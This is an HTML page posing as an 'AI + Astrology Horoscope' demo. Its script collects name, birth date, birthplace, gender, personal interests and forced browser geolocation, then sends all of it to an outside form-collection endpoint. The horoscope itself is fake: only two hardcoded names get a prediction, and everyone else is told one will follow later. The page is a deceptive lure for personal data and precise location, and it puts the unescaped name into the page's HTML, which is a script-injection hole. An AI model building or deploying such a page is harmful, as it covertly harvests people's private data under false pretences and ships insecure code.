<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AI + Astrology Horoscope Demo</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #121212;
      color: #f1f1f1;
      margin: 0;
      padding: 2rem;
    }
    .container {
      max-width: 600px;
      margin: auto;
      background: #1e1e1e;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
    }
    input, select, textarea, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: none;
      border-radius: 5px;
    }
    button {
      background-color: #6200ea;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .result {
      margin-top: 20px;
      padding: 15px;
      background-color: #292929;
      border-radius: 5px;
    }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="container">
    <h2>AI + Astrology Horoscope</h2>
    <form id="horoscopeForm">
      <input type="text" id="name" name="name" placeholder="Your Name" required />
      <input type="date" id="dob" name="dob" required />
      <input type="text" id="birthplace" name="birthplace" placeholder="Birthplace" required />
      <select id="gender" name="gender" required>
        <option value="">Select Gender</option>
        <option value="Male">Male</option>
        <option value="Female">Female</option>
        <option value="Other">Other</option>
      </select>
      <textarea id="favourites" name="favourites" placeholder="Your favorite things" required></textarea>
      <button type="submit">Check Now</button>
    </form>
    <div class="result hidden" id="result"></div>
  </div>

  <script>
    const form = document.getElementById('horoscopeForm');
    const resultBox = document.getElementById('result');

    const predictions = {
      "John Doe": "Today is your day to shine! A surprise awaits you.",
      "Alice Smith": "You may find unexpected luck and joy in your surroundings."
    };

    async function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject('Geolocation not supported');
        } else {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                lon: position.coords.longitude
              });
            },
            error => {
              reject('Permission denied');
            }
          );
        }
      });
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      resultBox.classList.add('hidden');
      const name = document.getElementById('name').value.trim();
      const dob = document.getElementById('dob').value;
      const birthplace = document.getElementById('birthplace').value.trim();
      const gender = document.getElementById('gender').value;
      const favourites = document.getElementById('favourites').value.trim();

      let location = {};
      try {
        location = await getLocation();
      } catch (err) {
        resultBox.innerHTML = 'Please allow location access to continue.';
        resultBox.classList.remove('hidden');
        return;
      }

      // Send data to Getform
      fetch('https://getform.io/f/allyroma', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name, dob, birthplace, gender, favourites,
          location: `${location.lat}, ${location.lon}`,
          timestamp: new Date().toISOString()
        })
      });

      // Show prediction or fallback message
      const prediction = predictions[name];
      if (prediction) {
        resultBox.innerHTML = `<strong>${name}</strong>, here is your prediction:<br>${prediction}`;
      } else {
        resultBox.innerHTML = `Thanks, ${name}! Your prediction is being generated. We will update you soon.`;
      }
      resultBox.classList.remove('hidden');
    });
  </script>
</body>
</html>
